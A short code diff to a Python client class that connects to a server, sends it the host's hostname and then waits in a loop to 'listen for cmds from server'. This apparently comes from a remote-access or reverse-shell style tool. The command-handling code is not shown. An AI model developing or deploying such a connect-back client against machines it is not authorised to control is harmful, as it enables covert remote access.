@@ -19,15 +19,12 @@ class Client:
 
             print("{}[+]{} Client connected to server".format(Colours.green, Colours.white))
 
-            print(self.c_sock.getsockname())
-            sys.exit()
-
             #NOTE: split __init__ up into small methods?
 
-            kill_code = self.c_sock.recv(1024).decode()
+            print(socket.gethostname())
 
-            #send server client ip, hostname and port
-            info = ()
+            #send hostname to client
+            self.c_sock.send(socket.gethostname().encode())
 
             #listen for cmds from server
             while True:
